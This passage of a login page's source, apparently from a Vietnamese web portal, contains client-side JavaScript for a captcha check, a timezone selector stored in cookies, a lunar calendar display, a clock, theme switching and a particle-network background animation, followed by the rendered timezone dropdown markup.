                        text: langJS['lang_captcha']
                    });
                    return false;
                }
            }

            Swal.fire({
                title: langJS['lang_login_text'],
                allowOutsideClick: () => !Swal.isLoading()
            });
            Swal.showLoading();

            form.submit();
        }

        $(document).on("contextmenu", function (e) {
            e.preventDefault();
        });

        $('img').on('dragstart', function (e) {
            e.preventDefault();
        });

        $(document).ready(function () {
            localStorage.clear();
            $('.maincontent').kendoTooltip({
                filter: 'ul.section-element li a',
                position: 'bottom'
            });
            $('.maincontent').kendoTooltip({
                filter: 'div.timezone a img',
                position: 'bottom'
            });
        });

        $("#timezone").kendoDropDownList({
            autoWidth: false,
            dataSource: [{"id":"Etc\/GMT+12","name":"(GMT-12:00) International Date Line West"},{"id":"Pacific\/Midway","name":"(GMT-11:00) Midway Island, Samoa"},{"id":"Pacific\/Honolulu","name":"(GMT-10:00) Hawaii"},{"id":"US\/Alaska","name":"(GMT-09:00) Alaska"},{"id":"America\/Los_Angeles","name":"(GMT-08:00) Pacific Time (US & Canada)"},{"id":"America\/Tijuana","name":"(GMT-08:00) Tijuana, Baja California"},{"id":"US\/Arizona","name":"(GMT-07:00) Arizona"},{"id":"America\/Chihuahua","name":"(GMT-07:00) Chihuahua, La Paz, Mazatlan"},{"id":"US\/Mountain","name":"(GMT-07:00) Mountain Time (US & Canada)"},{"id":"America\/Managua","name":"(GMT-06:00) Central America"},{"id":"US\/Central","name":"(GMT-06:00) Central Time (US & Canada)"},{"id":"America\/Mexico_City","name":"(GMT-06:00) Guadalajara, Mexico City, Monterrey"},{"id":"Canada\/Saskatchewan","name":"(GMT-06:00) Saskatchewan"},{"id":"America\/Bogota","name":"(GMT-05:00) Bogota, Lima, Quito, Rio Branco"},{"id":"US\/Eastern","name":"(GMT-05:00) Eastern Time (US & Canada)"},{"id":"US\/East-Indiana","name":"(GMT-05:00) Indiana (East)"},{"id":"Canada\/Atlantic","name":"(GMT-04:00) Atlantic Time (Canada)"},{"id":"America\/Caracas","name":"(GMT-04:00) Caracas, La Paz"},{"id":"America\/Manaus","name":"(GMT-04:00) Manaus"},{"id":"America\/Santiago","name":"(GMT-04:00) Santiago"},{"id":"Canada\/Newfoundland","name":"(GMT-03:30) Newfoundland"},{"id":"America\/Sao_Paulo","name":"(GMT-03:00) Brasilia"},{"id":"America\/Argentina\/Buenos_Aires","name":"(GMT-03:00) Buenos Aires, Georgetown"},{"id":"America\/Godthab","name":"(GMT-03:00) Greenland"},{"id":"America\/Montevideo","name":"(GMT-03:00) Montevideo"},{"id":"America\/Noronha","name":"(GMT-02:00) Mid-Atlantic"},{"id":"Atlantic\/Cape_Verde","name":"(GMT-01:00) Cape Verde Is."},{"id":"Atlantic\/Azores","name":"(GMT-01:00) Azores"},{"id":"Africa\/Casablanca","name":"(GMT+00:00) Casablanca, Monrovia, Reykjavik"},{"id":"Etc\/Greenwich","name":"(GMT+00:00) Greenwich Mean Time : Dublin, Edinburgh, Lisbon, London"},{"id":"Europe\/Amsterdam","name":"(GMT+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna"},{"id":"Europe\/Belgrade","name":"(GMT+01:00) Belgrade, Bratislava, Budapest, Ljubljana, Prague"},{"id":"Europe\/Brussels","name":"(GMT+01:00) Brussels, Copenhagen, Madrid, Paris"},{"id":"Europe\/Sarajevo","name":"(GMT+01:00) Sarajevo, Skopje, Warsaw, Zagreb"},{"id":"Africa\/Lagos","name":"(GMT+01:00) West Central Africa"},{"id":"Asia\/Amman","name":"(GMT+02:00) Amman"},{"id":"Europe\/Athens","name":"(GMT+02:00) Athens, Bucharest, Istanbul"},{"id":"Asia\/Beirut","name":"(GMT+02:00) Beirut"},{"id":"Africa\/Cairo","name":"(GMT+02:00) Cairo"},{"id":"Africa\/Harare","name":"(GMT+02:00) Harare, Pretoria"},{"id":"Europe\/Helsinki","name":"(GMT+02:00) Helsinki, Kyiv, Riga, Sofia, Tallinn, Vilnius"},{"id":"Asia\/Jerusalem","name":"(GMT+02:00) Jerusalem"},{"id":"Europe\/Minsk","name":"(GMT+02:00) Minsk"},{"id":"Africa\/Windhoek","name":"(GMT+02:00) Windhoek"},{"id":"Asia\/Kuwait","name":"(GMT+03:00) Kuwait, Riyadh, Baghdad"},{"id":"Europe\/Moscow","name":"(GMT+03:00) Moscow, St. Petersburg, Volgograd"},{"id":"Africa\/Nairobi","name":"(GMT+03:00) Nairobi"},{"id":"Asia\/Tbilisi","name":"(GMT+03:00) Tbilisi"},{"id":"Asia\/Tehran","name":"(GMT+03:30) Tehran"},{"id":"Asia\/Muscat","name":"(GMT+04:00) Abu Dhabi, Muscat"},{"id":"Asia\/Baku","name":"(GMT+04:00) Baku"},{"id":"Asia\/Yerevan","name":"(GMT+04:00) Yerevan"},{"id":"Asia\/Kabul","name":"(GMT+04:30) Kabul"},{"id":"Asia\/Yekaterinburg","name":"(GMT+05:00) Yekaterinburg"},{"id":"Asia\/Karachi","name":"(GMT+05:00) Islamabad, Karachi, Tashkent"},{"id":"Asia\/Calcutta","name":"(GMT+05:30) Chennai, Kolkata, Mumbai, New Delhi, Sri Jayawardenapura"},{"id":"Asia\/Katmandu","name":"(GMT+05:45) Kathmandu"},{"id":"Asia\/Almaty","name":"(GMT+06:00) Almaty, Novosibirsk"},{"id":"Asia\/Dhaka","name":"(GMT+06:00) Astana, Dhaka"},{"id":"Asia\/Rangoon","name":"(GMT+06:30) Yangon (Rangoon)"},{"id":"Asia\/Bangkok","name":"(GMT+07:00) Bangkok, H\u00e0 N\u1ed9i, Jakarta"},{"id":"Asia\/Krasnoyarsk","name":"(GMT+07:00) Krasnoyarsk"},{"id":"Asia\/Hong_Kong","name":"(GMT+08:00) Beijing, Chongqing, Hong Kong, Urumqi"},{"id":"Asia\/Kuala_Lumpur","name":"(GMT+08:00) Kuala Lumpur, Singapore"},{"id":"Asia\/Irkutsk","name":"(GMT+08:00) Irkutsk, Ulaan Bataar"},{"id":"Australia\/Perth","name":"(GMT+08:00) Perth"},{"id":"Asia\/Taipei","name":"(GMT+08:00) Taipei"},{"id":"Asia\/Tokyo","name":"(GMT+09:00) Osaka, Sapporo, Tokyo"},{"id":"Asia\/Seoul","name":"(GMT+09:00) Seoul"},{"id":"Asia\/Yakutsk","name":"(GMT+09:00) Yakutsk"},{"id":"Australia\/Adelaide","name":"(GMT+09:30) Adelaide"},{"id":"Australia\/Darwin","name":"(GMT+09:30) Darwin"},{"id":"Australia\/Brisbane","name":"(GMT+10:00) Brisbane"},{"id":"Australia\/Canberra","name":"(GMT+10:00) Canberra, Melbourne, Sydney"},{"id":"Australia\/Hobart","name":"(GMT+10:00) Hobart"},{"id":"Pacific\/Guam","name":"(GMT+10:00) Guam, Port Moresby"},{"id":"Asia\/Vladivostok","name":"(GMT+10:00) Vladivostok"},{"id":"Asia\/Vladivostok","name":"(GMT+11:00) Magadan, Solomon Is., New Caledonia"},{"id":"Pacific\/Auckland","name":"(GMT+12:00) Auckland, Wellington"},{"id":"Pacific\/Fiji","name":"(GMT+12:00) Fiji, Kamchatka, Marshall Is."},{"id":"Pacific\/Tongatapu","name":"(GMT+13:00) Nuku'alofa"}],
            filter: "contains",
            dataTextField: "name",
            dataValueField: "id",
            height: 200,
            change: function (e) {
                var value = this.value();
                // Use the value of the widget 
                setCookie('timezone', value, 30);
                location.reload();
            }
        });

        //Get timezone from Cookie
        if (timezone_cookie === "" || timezone_cookie === null) {
            setCookie('timezone', "Asia/Bangkok", 30);
            var timezonedropdownlist = $("#timezone").data("kendoDropDownList");
            timezonedropdownlist.value("Asia/Bangkok");
        } else {
            var timezonedropdownlist = $("#timezone").data("kendoDropDownList");
            timezonedropdownlist.value(timezone_cookie);
        }

        function changeElementColor(e) {
            let theme = $(e).data('theme');
            let linkthemes = base_url + 'modules/proui/css/stel/' + theme + '.css';
            let element = $(e).data('element');
            $('link[data-name="element-css"]').attr('href', linkthemes);
            $('a[data-name="element"]').removeClass('element_selected');
            $(e).addClass('element_selected');
            setCookie('element', element, 30);
            setCookie('elementlink', theme, 30);
        }

        // ÂM LỊCH
        var amlich = ALVN.getAll(parseInt('16'), parseInt('09'), parseInt('2022'));

        if (typeof amlich !== 'undefined') {
            if (typeof amlich.day !== 'undefined') {
                $('.day_col span.lunarday').text(amlich.day.num);
                $('.day_col span.specialday').text(amlich.day.canchi + ' (' + amlich.day.nguhanh + ')');
            }
            if (typeof amlich.month !== 'undefined') {
                $('.month_col span.lunarday').text(amlich.month.num);
                $('.month_col span.specialday').text(amlich.month.canchi + ' (' + amlich.month.nguhanh + ')');
            }
            if (typeof amlich.year !== 'undefined') {
                $('.year_col span.lunarday').text(amlich.year.num);
                $('.year_col span.specialday').text(amlich.year.canchi + ' (' + amlich.year.nguhanh + ')');
            }

            if (element_language === 'vietnamese') {
                if (typeof amlich.holiday !== 'undefined') {
                    $('.holiday').text(amlich.holiday);
                }
            } else {
                $('.holiday').text('');
            }
        }
        // ÂM LỊCH

        function showTime() {
            var date = new Date(timeserver);
            var h = date.getHours(); // 0 - 23
            var m = date.getMinutes(); // 0 - 59
            var s = date.getSeconds(); // 0 - 59
            var session = 'AM';

            if (h === 0) {
                h = 12;
            }

            if (h >= 12) {
                if (h > 12) {
                    h = h - 12;
                }
                session = 'PM';
            }

            h = (h < 10) ? "0" + h : h;
            m = (m < 10) ? "0" + m : m;
            s = (s < 10) ? "0" + s : s;

            let time = h + ":" + m + ":" + s + "";
            document.getElementById("time_clock").innerText = time;
            document.getElementById("time_clock").textContent = time;
            document.getElementById("ampm_time").innerText = session;
            document.getElementById("ampm_time").textContent = session;
            timeserver += 1000;
            setTimeout(showTime, 950);
        }

        showTime();

        function setVisible(selector, visible) {
            document.querySelector(selector).style.display = visible ? 'block' : 'none';
        }

        function changeLanguage(lang) {
            setCookie('language', lang, 30);
            location.reload();
        }

        if (element_cookie !== "" && element_cookie !== null) {
            $('a[data-name="element"]').removeClass('element_selected');
            $("a[data-element='" + element_cookie + "']").addClass('element_selected');
            var theme = $("a[data-element='" + element_cookie + "']").data('theme');
            let linkthemes = base_url + 'modules/proui/css/stel/' + theme + '.css';
            $('link[data-name="element-css"]').attr('href', linkthemes);
        } else {
            $('a[data-name="element"]').removeClass('element_selected');
            $("a[data-element='Shaphire']").addClass('element_selected');
            var theme = $("a[data-element='Shaphire']").data('theme');
            let linkthemes = base_url + 'modules/proui/css/stel/' + theme + '.css';
            $('link[data-name="element-css"]').attr('href', linkthemes);
        }

        if (element_language === 'english') {
            $('span.lunarday').addClass('hidden');
            $('span.specialday').addClass('hidden');
            $('.english').removeClass('unselect');
            $('.vietnamese').addClass('unselect');
        } else {
            $('span.lunarday').removeClass('hidden');
            $('span.specialday').removeClass('hidden');
            $('.vietnamese').removeClass('unselect');
            $('.english').addClass('unselect');
        }

        /**
         * Particle Network Animation
         * Inspiration: https://github.com/JulianLaval/canvas-particle-network
         */
        (function () {

            var ParticleNetworkAnimation, PNA;
            ParticleNetworkAnimation = PNA = function () {};

            PNA.prototype.init = function (element) {
                this.$el = $(element);

                this.container = element;
                this.canvas = document.createElement('canvas');
                this.sizeCanvas();
                this.container.appendChild(this.canvas);
                this.ctx = this.canvas.getContext('2d');
                this.particleNetwork = new ParticleNetwork(this);

                this.bindUiActions();

                return this;
            };

            PNA.prototype.bindUiActions = function () {
                $(window).on('resize', function () {
                    // this.sizeContainer();
                    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                    this.sizeCanvas();
                    this.particleNetwork.createParticles();
                }.bind(this));
            };

            PNA.prototype.sizeCanvas = function () {
                this.canvas.width = this.container.offsetWidth;
                this.canvas.height = this.container.offsetHeight;
            };

            var Particle = function (parent, x, y) {
                this.network = parent;
                this.canvas = parent.canvas;
                this.ctx = parent.ctx;
                this.particleColor = returnRandomArrayitem(this.network.options.particleColors);
                this.radius = getLimitedRandom(1.5, 2.5);
                this.opacity = 0;
                this.x = x || Math.random() * this.canvas.width;
                this.y = y || Math.random() * this.canvas.height;
                this.velocity = {
                    x: (Math.random() - 0.5) * parent.options.velocity,
                    y: (Math.random() - 0.5) * parent.options.velocity
                };
            };

            Particle.prototype.update = function () {
                if (this.opacity < 1) {
                    this.opacity += 0.01;
                } else {
                    this.opacity = 1;
                }
                // Change dir if outside map
                if (this.x > this.canvas.width + 100 || this.x < -100) {
                    this.velocity.x = -this.velocity.x;
                }
                if (this.y > this.canvas.height + 100 || this.y < -100) {
                    this.velocity.y = -this.velocity.y;
                }

                // Update position
                this.x += this.velocity.x;
                this.y += this.velocity.y;
            };

            Particle.prototype.draw = function () {
                // Draw particle
                this.ctx.beginPath();
                this.ctx.fillStyle = this.particleColor;
                this.ctx.globalAlpha = this.opacity;
                this.ctx.arc(this.x, this.y, this.radius, 0, 2 * Math.PI);
                this.ctx.fill();
            };

            var ParticleNetwork = function (parent) {
                this.options = {
                    velocity: 1, // the higher the faster
                    density: 15000, // the lower the denser
                    netLineDistance: 100,
                    netLineColor: '#ffffff8c',
                    particleColors: ['#ffffff8c'] // ['#6D4E5C', '#aaa', '#FFC458' ]
                };
                this.canvas = parent.canvas;
                this.ctx = parent.ctx;

                this.init();
            };

            ParticleNetwork.prototype.init = function () {
                // Create particle objects
                this.createParticles(true);

                // Update canvas
                this.animationFrame = requestAnimationFrame(this.update.bind(this));

                this.bindUiActions();
            };

            ParticleNetwork.prototype.createParticles = function (isInitial) {
                // Initialise / reset particles
                var me = this;
                this.particles = [];
                var quantity = this.canvas.width * this.canvas.height / this.options.density;

                if (isInitial) {
                    var counter = 0;
                    clearInterval(this.createIntervalId);
                    this.createIntervalId = setInterval(function () {
                        if (counter < quantity - 1) {
                            // Create particle object
                            this.particles.push(new Particle(this));
                        } else {
                            clearInterval(me.createIntervalId);
                        }
                        counter++;
                    }.bind(this), 250);
                } else {
                    // Create particle objects
                    for (var i = 0; i < quantity; i++) {
                        this.particles.push(new Particle(this));
                    }
                }
            };

            ParticleNetwork.prototype.createInteractionParticle = function () {
                // Add interaction particle
                this.interactionParticle = new Particle(this);
                this.interactionParticle.velocity = {
                    x: 0,
                    y: 0
                };
                this.particles.push(this.interactionParticle);
                return this.interactionParticle;
            };

            ParticleNetwork.prototype.removeInteractionParticle = function () {
                // Find it
                var index = this.particles.indexOf(this.interactionParticle);
                if (index > -1) {
                    // Remove it
                    this.interactionParticle = undefined;
                    this.particles.splice(index, 1);
                }
            };

            ParticleNetwork.prototype.update = function () {
                if (this.canvas) {

                    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                    this.ctx.globalAlpha = 1;

                    // Draw connections
                    for (var i = 0; i < this.particles.length; i++) {
                        for (var j = this.particles.length - 1; j > i; j--) {
                            var distance, p1 = this.particles[i],
                                    p2 = this.particles[j];

                            // check very simply if the two points are even a candidate for further measurements
                            distance = Math.min(Math.abs(p1.x - p2.x), Math.abs(p1.y - p2.y));
                            if (distance > this.options.netLineDistance) {
                                continue;
                            }

                            // the two points seem close enough, now let's measure precisely
                            distance = Math.sqrt(
                                    Math.pow(p1.x - p2.x, 2) +
                                    Math.pow(p1.y - p2.y, 2)
                                    );
                            if (distance > this.options.netLineDistance) {
                                continue;
                            }

                            this.ctx.beginPath();
                            this.ctx.strokeStyle = this.options.netLineColor;
                            this.ctx.globalAlpha = (this.options.netLineDistance - distance) / this.options
                                    .netLineDistance * p1.opacity * p2.opacity;
                            this.ctx.lineWidth = 0.7;
                            this.ctx.moveTo(p1.x, p1.y);
                            this.ctx.lineTo(p2.x, p2.y);
                            this.ctx.stroke();
                        }
                    }

                    // Draw particles
                    for (var i = 0; i < this.particles.length; i++) {
                        this.particles[i].update();
                        this.particles[i].draw();
                    }

                    if (this.options.velocity !== 0) {
                        this.animationFrame = requestAnimationFrame(this.update.bind(this));
                    }

                } else {
                    cancelAnimationFrame(this.animationFrame);
                }
            };

            ParticleNetwork.prototype.bindUiActions = function () {
                // Mouse / touch event handling
                this.spawnQuantity = 3;
                this.mouseIsDown = false;
                this.touchIsMoving = false;

                this.onMouseMove = function (e) {
                    if (!this.interactionParticle) {
                        this.createInteractionParticle();
                    }
                    this.interactionParticle.x = e.offsetX;
                    this.interactionParticle.y = e.offsetY;
                }.bind(this);

                this.onTouchMove = function (e) {
                    e.preventDefault();
                    this.touchIsMoving = true;
                    if (!this.interactionParticle) {
                        this.createInteractionParticle();
                    }
                    this.interactionParticle.x = e.changedTouches[0].clientX;
                    this.interactionParticle.y = e.changedTouches[0].clientY;
                }.bind(this);

                this.onMouseDown = function (e) {
                    this.mouseIsDown = true;
                    var counter = 0;
                    var quantity = this.spawnQuantity;
                    var intervalId = setInterval(function () {
                        if (this.mouseIsDown) {
                            if (counter === 1) {
                                quantity = 1;
                            }
                            for (var i = 0; i < quantity; i++) {
                                if (this.interactionParticle) {
                                    this.particles.push(new Particle(this, this.interactionParticle.x, this
                                            .interactionParticle.y));
                                }
                            }
                        } else {
                            clearInterval(intervalId);
                        }
                        counter++;
                    }.bind(this), 50);
                }.bind(this);

                this.onTouchStart = function (e) {
                    e.preventDefault();
                    setTimeout(function () {
                        if (!this.touchIsMoving) {
                            for (var i = 0; i < this.spawnQuantity; i++) {
                                this.particles.push(new Particle(this, e.changedTouches[0].clientX, e
                                        .changedTouches[0].clientY));
                            }
                        }
                    }.bind(this), 200);
                }.bind(this);

                this.onMouseUp = function (e) {
                    this.mouseIsDown = false;
                }.bind(this);

                this.onMouseOut = function (e) {
                    this.removeInteractionParticle();
                }.bind(this);

                this.onTouchEnd = function (e) {
                    e.preventDefault();
                    this.touchIsMoving = false;
                    this.removeInteractionParticle();
                }.bind(this);

                this.canvas.addEventListener('mousemove', this.onMouseMove);
                // this.canvas.addEventListener('touchmove', this.onTouchMove);
                // this.canvas.addEventListener('mousedown', this.onMouseDown);
                // this.canvas.addEventListener('touchstart', this.onTouchStart);
                // this.canvas.addEventListener('mouseup', this.onMouseUp);
                this.canvas.addEventListener('mouseout', this.onMouseOut);
                this.canvas.addEventListener('touchend', this.onTouchEnd);
            };

            ParticleNetwork.prototype.unbindUiActions = function () {
                if (this.canvas) {
                    this.canvas.removeEventListener('mousemove', this.onMouseMove);
                    // this.canvas.removeEventListener('touchmove', this.onTouchMove);
                    // this.canvas.removeEventListener('mousedown', this.onMouseDown);
                    // this.canvas.removeEventListener('touchstart', this.onTouchStart);
                    // this.canvas.removeEventListener('mouseup', this.onMouseUp);
                    this.canvas.removeEventListener('mouseout', this.onMouseOut);
                    this.canvas.removeEventListener('touchend', this.onTouchEnd);
                }
            };

            var getLimitedRandom = function (min, max, roundToInteger) {
                var number = Math.random() * (max - min) + min;
                if (roundToInteger) {
                    number = Math.round(number);
                }
                return number;
            };

            var returnRandomArrayitem = function (array) {
                return array[Math.floor(Math.random() * array.length)];
            };

            pna = new ParticleNetworkAnimation();
            pna.init($('.particle-network-animation')[0]);

        }());

        $(function () {
            Login.init();
        });


    </script><div class="k-list-container k-popup k-group k-reset" id="timezone-list" data-role="popup" aria-hidden="true" style="display: none; position: absolute;"><span class="k-list-filter"><input class="k-textbox" role="searchbox" aria-haspopup="listbox" aria-autocomplete="list" aria-controls="timezone_listbox" tabindex="0" aria-disabled="false" aria-readonly="false" aria-activedescendant="f7ab7724-645c-4ebb-a3b6-849de76670e7"><span class="k-icon k-i-zoom"></span></span><div class="k-group-header" style="display:none"></div><div class="k-list-scroller" unselectable="on"><ul unselectable="on" class="k-list k-reset" tabindex="-1" aria-hidden="true" id="timezone_listbox" aria-live="polite" data-role="staticlist" role="listbox"><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="0">(GMT-12:00) International Date Line West</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="1">(GMT-11:00) Midway Island, Samoa</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="2">(GMT-10:00) Hawaii</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="3">(GMT-09:00) Alaska</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="4">(GMT-08:00) Pacific Time (US &amp; Canada)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="5">(GMT-08:00) Tijuana, Baja California</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="6">(GMT-07:00) Arizona</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="7">(GMT-07:00) Chihuahua, La Paz, Mazatlan</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="8">(GMT-07:00) Mountain Time (US &amp; Canada)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="9">(GMT-06:00) Central America</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="10">(GMT-06:00) Central Time (US &amp; Canada)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="11">(GMT-06:00) Guadalajara, Mexico City, Monterrey</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="12">(GMT-06:00) Saskatchewan</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="13">(GMT-05:00) Bogota, Lima, Quito, Rio Branco</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="14">(GMT-05:00) Eastern Time (US &amp; Canada)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="15">(GMT-05:00) Indiana (East)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="16">(GMT-04:00) Atlantic Time (Canada)</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="17">(GMT-04:00) Caracas, La Paz</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="18">(GMT-04:00) Manaus</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="19">(GMT-04:00) Santiago</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="20">(GMT-03:30) Newfoundland</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="21">(GMT-03:00) Brasilia</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="22">(GMT-03:00) Buenos Aires, Georgetown</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="23">(GMT-03:00) Greenland</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="24">(GMT-03:00) Montevideo</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="25">(GMT-02:00) Mid-Atlantic</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="26">(GMT-01:00) Cape Verde Is.</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="27">(GMT-01:00) Azores</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="28">(GMT+00:00) Casablanca, Monrovia, Reykjavik</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="29">(GMT+00:00) Greenwich Mean Time : Dublin, Edinburgh, Lisbon, London</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="30">(GMT+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="31">(GMT+01:00) Belgrade, Bratislava, Budapest, Ljubljana, Prague</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="32">(GMT+01:00) Brussels, Copenhagen, Madrid, Paris</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="33">(GMT+01:00) Sarajevo, Skopje, Warsaw, Zagreb</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="34">(GMT+01:00) West Central Africa</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="35">(GMT+02:00) Amman</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="36">(GMT+02:00) Athens, Bucharest, Istanbul</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="37">(GMT+02:00) Beirut</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="38">(GMT+02:00) Cairo</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="39">(GMT+02:00) Harare, Pretoria</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="40">(GMT+02:00) Helsinki, Kyiv, Riga, Sofia, Tallinn, Vilnius</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="41">(GMT+02:00) Jerusalem</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="42">(GMT+02:00) Minsk</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="43">(GMT+02:00) Windhoek</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="44">(GMT+03:00) Kuwait, Riyadh, Baghdad</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="45">(GMT+03:00) Moscow, St. Petersburg, Volgograd</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="46">(GMT+03:00) Nairobi</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="47">(GMT+03:00) Tbilisi</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="48">(GMT+03:30) Tehran</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="49">(GMT+04:00) Abu Dhabi, Muscat</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="50">(GMT+04:00) Baku</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="51">(GMT+04:00) Yerevan</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="52">(GMT+04:30) Kabul</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="53">(GMT+05:00) Yekaterinburg</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="54">(GMT+05:00) Islamabad, Karachi, Tashkent</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="55">(GMT+05:30) Chennai, Kolkata, Mumbai, New Delhi, Sri Jayawardenapura</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="56">(GMT+05:45) Kathmandu</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="57">(GMT+06:00) Almaty, Novosibirsk</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="58">(GMT+06:00) Astana, Dhaka</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="59">(GMT+06:30) Yangon (Rangoon)</li><li tabindex="-1" role="option" unselectable="on" class="k-item k-state-focused k-state-selected" aria-selected="true" data-offset-index="60" id="f7ab7724-645c-4ebb-a3b6-849de76670e7">(GMT+07:00) Bangkok, Ha Noi, Jakarta</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="61">(GMT+07:00) Krasnoyarsk</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="62">(GMT+08:00) Beijing, Chongqing, Hong Kong, Urumqi</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="63">(GMT+08:00) Kuala Lumpur, Singapore</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="64">(GMT+08:00) Irkutsk, Ulaan Bataar</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="65">(GMT+08:00) Perth</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="66">(GMT+08:00) Taipei</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="67">(GMT+09:00) Osaka, Sapporo, Tokyo</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="68">(GMT+09:00) Seoul</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="69">(GMT+09:00) Yakutsk</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="70">(GMT+09:30) Adelaide</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="71">(GMT+09:30) Darwin</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="72">(GMT+10:00) Brisbane</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="73">(GMT+10:00) Canberra, Melbourne, Sydney</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="74">(GMT+10:00) Hobart</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="75">(GMT+10:00) Guam, Port Moresby</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="76">(GMT+10:00) Vladivostok</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="77">(GMT+11:00) Magadan, Solomon Is., New Caledonia</li><li tabindex="-1" 